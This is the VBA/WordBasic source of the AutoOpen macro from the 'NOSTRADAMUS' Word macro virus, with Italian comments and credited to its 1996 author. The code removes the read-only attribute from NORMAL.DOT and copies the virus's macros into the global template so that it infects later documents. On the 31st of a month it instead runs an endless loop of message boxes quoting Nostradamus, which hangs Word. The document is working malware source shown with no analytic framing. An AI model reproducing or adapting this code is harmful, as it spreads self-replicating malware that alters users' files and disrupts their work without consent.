   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "This is the Main Infection Macro.\r\nIt's loaded when you open a .DOC"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
   Dim Giorno
   Dim NORMALDir$
   Dim Nome$
   Rem NOSTRADAMUS Virus
   Rem Macro : [AutoOpen]
   Rem Coded by PFloriK 2/12/1996

   On Error GoTo -1: On Error GoTo Fine

   Rem Se il giorno e' il 31 si attiva, altrimenti continua l'infezione
   Giorno = WordBasic.Day(WordBasic.Now())
   If Giorno = 31 Then GoTo Attivo
   GoTo NonAttivo

   Rem In caso di attivazione viene mostrata la seguente finestra
   Attivo:
   WordBasic.MsgBox "Barbaro impero dal terzo sarai soggiogato," + Chr(13) + _
          "Gran parte d'individui della sua origine farà perire:" + Chr(13) + _
          "Per decesso senile avverrà la sua fine, il quarto colpirà" + Chr(13) _
         + "Per timore che il sangue con il sangue morte ne derivi." + Chr(13) _
         + Chr(13) + "Centuria 3°, LIX", "NOSTRADAMUS Virus", 0
   GoTo Attivo


   NonAttivo:
   Rem Toglie la protezione (ATTRIB -R) dal file NORMAL.DOT
   NORMALDir$ = WordBasic.[DefaultDir$](15)
   SetAttr NORMALDir$ + "\NORMAL.DOT", 0
   SetAttr NORMALDir$ + "\NORMAL.DOT", 32

   Rem Copia nei modelli le seguenti 3 macro
   Nome$ = WordBasic.[FileName$]()
   WordBasic.MacroCopy Nome$ + ":FileModelli", "Normal:FileModelli", 1
   WordBasic.MacroCopy Nome$ + ":StrumMacro", "Normal:StrumMacro", 1
   WordBasic.MacroCopy Nome$ + ":MacroOnFile", "Normal:FileSalva", 1
   WordBasic.MacroCopy Nome$ + ":AutoOpen", "Normal:MacroOnNORMAL", 1


   Fine:
   End Sub
